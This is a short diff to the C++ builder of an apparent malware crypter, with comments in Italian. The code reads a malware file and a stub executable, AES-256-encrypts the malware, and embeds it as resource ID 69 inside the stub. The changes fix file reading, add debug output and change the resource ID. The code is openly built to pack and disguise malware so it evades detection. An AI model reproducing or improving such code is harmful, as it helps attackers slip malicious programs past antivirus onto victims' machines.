@@ -99,6 +99,8 @@ int main(int argc, char* argv[]){
     fseek(pMalware, 0, SEEK_END);          // Jump to the end of the file
     malwareLen = ftell(pMalware);          // Get the current byte offset in the file
     rewind(pMalware);                      // Jump back to the beginning of the file
+    malware = new unsigned char[malwareLen];
+    fread(malware, malwareLen, 1, pMalware);   // Read in the entire file
     fclose(pMalware);
     //////////////////////////////
     //prendo il path dello stub  lo apro in modalita' read-byte 
@@ -107,22 +109,21 @@ int main(int argc, char* argv[]){
     fseek(pStub, 0, SEEK_END);          // Jump to the end of the file
     stubLen = ftell(pStub);          // Get the current byte offset in the file
     rewind(pStub);                      // Jump back to the beginning of the file
+    stub = new unsigned char[stubLen];
+
+    fread(stub, stubLen, 1, pStub);   // Read in the entire file
     fclose(pStub);
 
     //////////////////////////////
     //copio i raw bytes dei file malwere e stub in due array di unsigned char
-    malware = new unsigned char[malwareLen];
-    stub = new unsigned char[stubLen];
-    memcpy(malware, pMalware, malwareLen); //copio la sequenza di byte del malware nel mio array malware
-    memcpy(stub, pStub, stubLen); //copio la sequenza di byte del malware nel mio array malware
-
-
-    AESEncrypt(malware, malwareLen, (char *)key, sizeof(key)); //cripto in AES-256 il malware
     for(int i = 0; i < 2000; i++){
         printf("%c",malware[i]);
     }
+    printf("\n\n\n\n");
+    AESEncrypt(malware, malwareLen, (char *)key, sizeof(key)); //cripto in AES-256 il malware
+
     AESDecrypt(malware, malwareLen, (char *)key, sizeof(key)); //decripto in AES-256 il malware
-    for(int i = 0; i < 2000; i++){
+    for(int i = 0; i < 5000; i++){
         printf("%c",malware[i]);
     }
     AESEncrypt(malware, malwareLen, (char *)key, sizeof(key)); //cripto in AES-256 il malware
@@ -143,7 +144,7 @@ int main(int argc, char* argv[]){
     //ringraziamo il cielo che in AES-256 la lunghezza dei byte originali e dei criptati e' la stessa
     //69 e' molto importante perche' e' l'ID della risorsa che andremo a creare, quindi nello stub dovremo usare lo stesso id_risorsa
     //(potevo dargli qualsiasi valore ma 69 e' figo), BIN e' il tipo di risorsa (ovvero raw bytes)
-    result = UpdateResource(hUpdateRes, "BIN", MAKEINTRESOURCE(132), NULL, malware, malwareLen);
+    result = UpdateResource(hUpdateRes, "BIN", MAKEINTRESOURCE(69), NULL, malware, malwareLen);
 
     if(result == FALSE){
         printf("impossibile aggiungere le risorse allo stub");
